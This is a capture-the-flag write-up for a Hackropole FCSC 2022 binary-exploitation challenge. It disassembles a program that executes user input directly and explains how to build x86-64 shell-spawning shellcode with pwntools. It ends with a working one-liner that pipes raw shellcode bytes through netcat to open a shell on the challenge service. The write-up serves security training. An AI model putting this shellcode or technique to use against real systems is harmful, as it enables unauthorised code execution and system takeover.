# URL
https://hackropole.fr/en/challenges/pwn/fcsc2022-pwn-shellcode/
# Concept
* creating shellcode for binary exploits
# Method of solve
* this is the disassembly for the main function of the program:
```asm
┌ 52: int main (int argc, char **argv, char **envp);
│ afv: vars(1:sp[0x208..0x208])
│           0x5580999bb135      55             push rbp
│           0x5580999bb136      4889e5         mov rbp, rsp
│           0x5580999bb139      4881ec0002..   sub rsp, 0x200
│           0x5580999bb140      488d8500fe..   lea rax, [var_200h]
│           0x5580999bb147      ba00020000     mov edx, 0x200          ; 512
│           0x5580999bb14c      4889c6         mov rsi, rax
│           0x5580999bb14f      bf00000000     mov edi, 0
│           0x5580999bb154      e8d7feffff     call sym.imp.read       ; ssize_t read(int fildes, void *buf, size_t nbyte)                                                  
│           0x5580999bb159      488d8500fe..   lea rax, [var_200h]
│           0x5580999bb160      ffd0           call rax
│           0x5580999bb162      b800000000     mov eax, 0
│           0x5580999bb167      c9             leave
└           0x5580999bb168      c3             ret
```
* the important instructions to pay attention to are these:
```asm
sub rsp, 0x200
lea rax, [var_200h]
```
* this makes space behind the stack pointer (512 bytes) for the variable `[var_200h]`, then loads that variable's address into the `rax` register
```asm
call sym.imp.read
```
* this instruction reads in user input into the `[var_200h]` variable
```
lea rax, [var_200h]
call rax
```
* and finally, these instructions load whatever is in the `[var_200h]` variable in `rax` and executes the code at `rax`
* we want `rax` to contain shellcode, which will open an interactive shell to the remote server when executed
## Creating the shellcode
* before we create the shellcode, we need to confirm a couple of details:
  * the type of CPU the program is running on
  * the architecture of that CPU (32-bit or 64-bit)
* a quick `file` command lets us know that this is a x86-64 binary, which answers both of our questions
### Creating the shellcode with Pwntools
* the `pwntools` `pwn` tool can create shellcode for us through its `shellcraft` function:
```
pwn shellcraft amd64.linux.sh -f d
```
## Opening a shell with Linux tools
```Bash
(perl -e 'print "\x6a\x6b\x58\x0f\x05\x48\x89\xc7\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"'; cat) | nc localhost 4000
```
